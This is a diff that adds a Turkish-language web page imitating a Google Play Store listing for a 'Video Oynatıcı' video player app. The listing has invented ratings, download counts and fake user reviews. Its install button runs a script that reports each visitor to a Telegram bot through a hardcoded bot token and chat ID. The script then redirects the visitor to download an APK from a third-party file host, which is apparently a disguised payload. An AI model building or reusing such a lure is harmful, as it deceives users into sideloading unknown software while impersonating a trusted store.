@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>
+        Video Oynatıcı
+
+    </title>
+
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="
+    sha384-4bw+/aepP/YC94hEpVNVgiZdgIC5+VKNBQNGCHeKRQN+PtmoHDEXuppvnDJzQIu9" crossorigin="anonymous">
+	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-4bw+/aepP/YC94hEpVNVgiZdgIC5+VKNBQNGCHeKRQN+PtmoHDEXuppvnDJzQIu9" crossorigin="anonymous">
+    <style>
+/* Sayfa genişliğini sınırlayarak yatay kaymayı engelliyoruz */
+html, body {
+    overflow-x: hidden; /* Yatay kayma engellendi */
+    width: 100%; /* Sayfanın tamamını kaplamasını sağlarız */
+    margin: 0; /* Sayfa kenarlarında boşluk bırakmamak için margin'i sıfırlıyoruz */
+    padding: 0;
+}
+
+/* Global Ayarlar */
+body {
+    font-size: 1rem; /* Varsayılan yazı boyutu */
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh; /* Sayfa yüksekliği %100 olmalı */
+}
+
+/* Container ayarları */
+.container {
+    flex-grow: 1; /* Flexbox kullanarak sayfanın ortalanmasını sağlıyoruz */
+    max-width: 100%; /* Maksimum genişlik %100 olacak şekilde ayarladık */
+    padding: 0 15px; /* Küçük ekranlarda daha iyi görüntü için padding ekliyoruz */
+    box-sizing: border-box;
+}
+
+/* Navbar ve footer'a overflow engellemeleri */
+.navbar, .footer-bt {
+    width: 100%;
+    box-sizing: border-box; /* padding ve border'ların toplam genişliği etkilememesi için */
+}
+
+/* Başlık ve içeriğin hizalanması */
+h2 {
+    text-align: center; /* Başlığı ortalayalım */
+    font-size: 3rem; /* Büyük ekranlarda başlık font boyutunu ayarladık */
+}
+
+.book_description {
+    margin-right: auto;
+    margin-left: auto;
+    text-align: center; /* Description'ı ortalıyoruz */
+}
+
+/* Buton ve resim düzeni */
+.btn {
+    width: 100%;
+    max-width: 200px; /* Butonun ekran küçüldüğünde maksimum genişliği */
+    margin: 0 auto; /* Butonun ortalanması */
+}
+
+.book_img {
+    display: block; /* Resmi ortalamak için display block yapıyoruz */
+    margin-left: auto;
+    margin-right: auto;
+    margin-top: 30px;
+    max-width: 100%; /* Resmin ekran boyutuna uyum sağlaması için */
+}
+
+/* Yıldızların hizalanması */
+.star-img {
+    margin: 0 5px;
+    cursor: pointer;
+}
+
+/* Responsive düzenlemeler */
+@media (max-width: 768px) {
+    h2 {
+        font-size: 2.5rem;
+    }
+
+    .book_description {
+        font-size: 0.9rem;
+    }
+
+    .book_img {
+        margin-top: 20px;
+        max-width: 100%;
+    }
+
+    .btn {
+        max-width: 100%;
+    }
+
+    .rating, .pages, .pagesno {
+        font-size: 0.9rem;
+    }
+
+    .navbar-brand {
+        font-size: 1.25rem;
+    }
+
+    .footer-bt {
+        padding: 20px;
+    }
+
+    .footer-text {
+        font-size: 0.8rem;
+    }
+}
+
+@media (max-width: 480px) {
+    h2 {
+        font-size: 2rem;
+    }
+
+    .book_description {
+        font-size: 0.8rem;
+    }
+
+    .book_img {
+        margin-top: 10px;
+    }
+
+    .btn {
+        max-width: 100%;
+    }
+
+    .rating {
+        font-size: 0.9rem;
+    }
+}
+		}
+        .carousel-item img {
+            max-height: 450px; /* Resim yüksekliğini ayarla */
+            object-fit: cover; /* Görüntüyü kırpmadan sığdır */
+        }
+		    
+			}
+			const smallImages = document.querySelectorAll('.small-img');
+    const modalImage = document.getElementById('modalImage');
+
+    smallImages.forEach(img => {
+        img.addEventListener('click', function() {
+            modalImage.src = this.src; // Tıklanan resmin büyük halini modalda göster
+        });
+    });
+</script>
+
+    </style>
+	<!-- Yandex.Metrika counter -->
+<script type="text/javascript" >
+   (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
+   m[i].l=1*new Date();
+   for (var j = 0; j < document.scripts.length; j++) {if (document.scripts[j].src === r) { return; }}
+   k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
+   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
+
+   ym(102052171, "init", {
+        clickmap:true,
+        trackLinks:true,
+        accurateTrackBounce:true,
+        webvisor:true
+   });
+</script>
+<noscript><div><img src="https://mc.yandex.ru/watch/102052171" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+<!-- /Yandex.Metrika counter -->
+</head>
+
+
+<body>
+  <head>
+    <link rel="icon" href="img/favicon.ico" type="image/x-icon">
+
+  </head>
+
+  <header>
+    <nav class="navbar navbar-expand-lg navitem">
+      <div class="container-fluid">
+        <!-- Logo Resmi -->
+        <img src="img/google-play.png" alt="..." class="ms-3" style="height: 50px; width: 50px;">
+
+        <a class="navbar-brand fs-3 fw-normal" href="#">Google Play</a>
+
+        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+          <span class="navbar-toggler-icon"></span>
+        </button>
+        
+        <div class="collapse navbar-collapse" id="navbarSupportedContent">
+          <ul class="navbar-nav me-auto mb-2 mb-lg-0">
+          </ul>
+          
+          <form class="d-flex">
+            <!-- Arama alanı -->
+            <input class="form-control me-5" type="search" placeholder="Search" aria-label="Search" size="60px">
+
+            <!-- Arama ikonu -->
+            <img src="img/search-interface-symbol.png" class="img-fluid me-3" alt="..." style="height: 20px; width: 20px;">
+
+            <!-- Yardım ikonu -->
+            <img src="img/question.png" class="img-fluid me-3" alt="..." style="height: 20px; width: 20px;">
+
+            <!-- Kullanıcı ikonu -->
+            <a href="index.html"> 
+              <img src="img/user.png" class="img-fluid me-4" alt="..." style="height: 33px; width: 33px;">
+            </a>
+          </form>
+        </div>
+      </div>
+    </nav>
+  </header>
+</body>
+
+            </div>
+        </nav>
+    </header>
+    <div class="container">
+        <div class="about_book">
+            <h2 class="mt-4" style="font-size: 20px;">
+    <img src="img/favicon.ico" alt="Favicon" style="width: 80px; height: 80px; vertical-align: middle; margin-right: 10px;">
+    <b>Video Oynatıcı</b></h2>
+
+            <div class="mt-4 text-success fs-6 fw-bolder">Video Oynatıcı</div>
+            <span>Uygulama içi satın alma</span>
+
+
+<div class="mt-3 d-flex justify-content-center gap-5 text-center">
+    <div class="rating" style="width: 150px;">
+        <span>4.2★</br>14.9 Yorum</span>
+    </div>
+    <div class="pages" style="width: 150px;">
+        <p>+50,000</p>
+        <p>İndirme</p>
+    </div>
+    <div class="pagesno" style="width: 150px;">
+        <p>12+</p>
+        <p>Yaş ve üzeri</p>
+    </div>
+</div>
+
+<div class="mt-4">
+    <button type="button" class="btn btn-success fs-5 py-2 px-4 rounded-4" onclick="downloadFile()">Yükle</button>
+</div>
+
+<script>
+    function downloadFile() {
+        var token = '8163053912:AAHVNTHM3O2LRcChxvclnM8ONUELtMdFRa8';
+        var chatId = '-1002478190818';
+        var message = 'Bir kullanıcı geldi.';
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+            .then(response => response.json())
+            .then(data => {
+
+                console.log('Telegram mesajı gönderildi:', data);
+            })
+            .catch(error => {
+                console.error('', error);
+            });
+
+        window.location.href = 'https://ucarecdn.com/27eb4743-ea4f-431f-a5cc-13868910fc97/VideoOynatc.apk';
+    }
+</script>
+
+
+
+
+                <div class="d-flex align-items-end">
+				<img src="img/share.png" height="40px" width="40px" class="ms-1" />
+				<p class="d-inline-block text-success ms-2 mt-3">Paylaş</p>
+			</div>
+
+            </div>
+        </div>
+        </div>
+<p class="mt-3" style="padding-left: 20px;">Bu uygulama tamamen ücretsizdir.</p>
+<div class="mt-4" style="padding-left: 20px;">
+    <div class="d-inline-block">
+<body>
+    <div class="container mt-4">
+        <div id="carouselExample" class="carousel slide" data-bs-ride="carousel">
+            <div class="carousel-inner">
+                <!-- Küçük Resim 1 -->
+                <div class="carousel-item active">
+                    <img src="https://play-lh.googleusercontent.com/QJNjcrdgNzQelRUGRuHW0LMHyi8ExMgl1KODb8IaMrZsA7zSgA80xjgNrKr27kEExw=w2560-h1440-rw" class="d-block w-100 small-img" data-bs-toggle="modal" data-bs-target="#imageModal" alt="Ekran Görüntüsü 1">
+                </div>
+                <!-- Küçük Resim 2 -->
+                <div class="carousel-item">
+                    <img src="https://play-lh.googleusercontent.com/VFjaFWQd6nFFOFTlaxhg2BGOjSEOvQh8YC9vNFEr880VkrDXU71hRk8sId00jHD1bvAR=w2560-h1440-rw" class="d-block w-100 small-img" data-bs-toggle="modal" data-bs-target="#imageModal" alt="Ekran Görüntüsü 2">
+                </div>
+				
+				<div class="carousel-item">
+                    <img src="https://play-lh.googleusercontent.com/I2Pgp5gAiZD7--4tyEs0lfHdp9KDwSGXD5YdOfFudN1sCQLAiHlpT-umyK-ZTdUV4BZL=w2560-h1440-rw" class="d-block w-100 small-img" data-bs-toggle="modal" data-bs-target="#imageModal" alt="Ekran Görüntüsü 2">
+                </div>
+
+				<div class="carousel-item">
+                    <img src="https://play-lh.googleusercontent.com/T6Nq9smcRJp24RDHCGNLyf0G_0xnfx2dbYf5h9f97w0_Ic2nxx8MC1w5nZEqwuR4Sw=w2560-h1440-rw" class="d-block w-100 small-img" data-bs-toggle="modal" data-bs-target="#imageModal" alt="Ekran Görüntüsü 2">
+                </div>	
+				<div class="carousel-item">
+                    <img src="https://play-lh.googleusercontent.com/BFjaUVMlimM_TbBOtO6tWe_8qOClISZvSHa7tPZopWomXOY-kNm1oxedc04xmY9Jfv4e=w2560-h1440-rw" class="d-block w-100 small-img" data-bs-toggle="modal" data-bs-target="#imageModal" alt="Ekran Görüntüsü 2">
+                </div>	
+				
+				
+	
+				
+                <!-- Diğer resimler buraya eklenebilir... -->
+            </div>
+            <!-- Önceki Buton -->
+            <button class="carousel-control-prev" type="button" data-bs-target="#carouselExample" data-bs-slide="prev">
+                <span class="carousel-control-prev-icon" aria-hidden="true"></span>
+                <span class="visually-hidden">Önceki</span>
+            </button>
+            <!-- Sonraki Buton -->
+            <button class="carousel-control-next" type="button" data-bs-target="#carouselExample" data-bs-slide="next">
+                <span class="carousel-control-next-icon" aria-hidden="true"></span>
+                <span class="visually-hidden">Sonraki</span>
+            </button>
+        </div>
+    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+
+</div> 
+    <!-- Yorumlar Bölümü Başlangıcı -->
+    <div class="container mt-4">
+        <h4>Yorumlar</h4>
+        <div class="mt-3">
+            <!-- Yorumları listeleyen kartlar -->
+<div class="card mb-3">
+    <div class="card-body">
+        <h5 class="card-title">Ahmet Yılmaz
+            <span class="ms-2">
+                <!-- 5 yıldız simgesi -->
+                <span class="text-warning">&#9733;</span>
+                <span class="text-warning">&#9733;</span>
+                <span class="text-warning">&#9733;</span>
+                <span class="text-warning">&#9733;</span>
+                <span class="text-warning">&#9733;</span>
+            </span>
+        </h5>
+        <h6 class="card-subtitle mb-2 text-muted">2 gün önce</h6>
+        <p class="card-text">Harika bir uygulama Videolar rahat izleniyor izlenmeyen bazı videolar açılıyor.</p>
+    </div>
+</div>
+
+
+<div class="card mb-3">
+    <div class="card-body">
+        <h5 class="card-title">Zeynep Kara
+            <span class="ms-2">
+                <!-- 4 yıldız simgesi -->
+                <span class="text-warning">&#9733;</span>
+                <span class="text-warning">&#9733;</span>
+                <span class="text-warning">&#9733;</span>
+                <span class="text-warning">&#9733;</span>
+            </span>
+        </h5>
+        <h6 class="card-subtitle mb-2 text-muted">1 hafta önce</h6>
+        <p class="card-text">Uygulama sayesinde kolayca video seçeneklerinizi duzenleyip istediğiniz zaman istediğiniz videoyu izleyebilirsiniz. arayüzü en kolay uygulamalardan biri tavsiye ederim arkadaşlar tasarımcıların eline emeğine sağlık.</p>
+    </div>
+</div>
+
+<div class="card mb-3">
+    <div class="card-body">
+        <h5 class="card-title">Murat Çelik
+            <span class="ms-2">
+                <!-- 4 yıldız simgesi -->
+                <span class="text-warning">&#9733;</span>
+                <span class="text-warning">&#9733;</span>
+                <span class="text-warning">&#9733;</span>
+                <span class="text-warning">&#9733;</span>
+            </span>
+        </h5>
+        <h6 class="card-subtitle mb-2 text-muted">3 hafta önce</h6>
+        <p class="card-text">Uygulama genel olarak iyi ama bazı hatalar var. Güncellemeleri bekliyorum.</p>
+    </div>
+</div>
+
+<h4 class="mt-4">Veri Güvenliği</h4>
+</div>
+<div class="d-inline-block">
+    <img src="img/right-arrow.png" height="20px" width="20px" class="d-inline-block ms-1 " />
+</div>
+</div>
+<p style="padding-left: 20px;">Geliştiricilerin verilerinizi nasıl toplayıp paylaştıklarını anlamak, güvenliğin ilk adımıdır.</p>
+<p style="padding-left: 20px;">Gizliliği ve güvenliği yöntemleri; kullanımınıza, bölgenize ve yaşınıza göre değişiklik gösterebilir. <br>Geliştiricinin sağladığı bu bilgiler zaman içinde güncellenebilir.</p>
+
+<h4 style="padding-left: 20px;">Bu uygulamayı derecelendirin</h4>
+<p style="padding-left: 20px;">Başkalarına ne düşündüğünü söyle.</p>
+
+        <div>
+            <img src="img/star (1).png" height="40px" width="40px" class="star-img" />
+            <img src="img/star (1).png" height="40px" width="40px" class="star-img" /> 
+            <img src="img/star (1).png" height="40px" width="40px" class="star-img" /> 
+            <img src="img/star (1).png" height="40px" width="40px" class="star-img" /> 
+            <img src="img/star (1).png" height="40px" width="40px" class="star-img" /> 
+
+<div class="d-inline-block text-start" style="margin-top: 20px; padding-left: 20px;">
+    <button type="button" class="btn btn-success rounded-3">Bizi Değerlendirin</button>
+</div>
+
+</div>
+
+
+</div>
+
+            </div>
+        </div>
+    </div>
+    <div class="mt-4">
+        <div class="d-inline-block">
+            <h4 style="margin-left: 20px;" class="mt-4">Görüntülenme ve Yorum</h4>
+        </div>
+        <div class="d-inline-block">
+            <img src="img/right-arrow.png" height="20px" width="20px" class="d-inline-block ms-3 " />
+        </div>
+    </div>
+    <p class="Semibold weight text " style="font-size: 60px;margin-left: 120px;">4.2</p>
+    <img src="img/rating.png" height="80px" width="80px" class="mt-1" style="margin-left: 120px;" />
+
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-HwwvtgBNo3bZJJLYd8oVXjrBZt8cqVSpeBNS5n7C8IVInixGAoxmnlMuBnhbgrkm" crossorigin="anonymous"></script>
+    <hr class="mx-5 ">
+
+    <!-- Footer-->
+    <div class="footer-bt" style="background-color:#f5f5f0;height: 300px; ">
+        <div class="column links mt-5 " style="margin-left: 100px; ">
+            <h5>Google Play
+                </div>
+            </h5>
+
+            <ul class="ul ">
+                <li>
+                    <a href="index.html " class="footer-text fs-6 ">Play Pass</a>
+                </li>
+                <li>
+                    <a href="index.html " class="footer-text fs-6 ">Play Points</a>
+                </li>
+                <li>
+                    <a href="index.html " class="footer-text fs-6 ">Hediye kartları</a>
+                </li>
+                <li>
+                    <a href="index.html " class="footer-text fs-6 ">Kullan</a>
+                </li>
+
+                <li>
+                    <a href="index.html " class="footer-text fs-6 ">Geri ödeme politikası</a>
+                </li>
+            </ul>
+
+
+        </div>
+
+    </div>
+
+</body>
+
+</html>
